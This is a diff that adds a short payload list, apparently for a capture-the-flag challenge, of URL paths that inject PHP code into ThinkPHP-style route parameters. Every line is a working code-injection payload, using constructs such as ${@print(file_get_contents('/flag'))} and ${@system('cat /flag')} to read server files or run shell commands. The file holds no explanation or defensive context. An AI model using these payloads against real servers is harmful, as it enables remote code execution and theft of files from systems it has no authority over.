@@ -1,0 +1,6 @@
+/index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}
+/index.php?s=/Index/index/name/${@print(file_get_contents('/flag.txt'))}
+/index.php?s=/Index/index/name/${@system('cat /flag')}
+/index.php?s=/Show/index/id/${@print(file_get_contents('/flag'))}
+/index.php?s=/Article/index/id/${@print(file_get_contents('/flag'))}
+/index.php?m=Home&c=Index&a=index&name=${@print(file_get_contents('/flag'))}
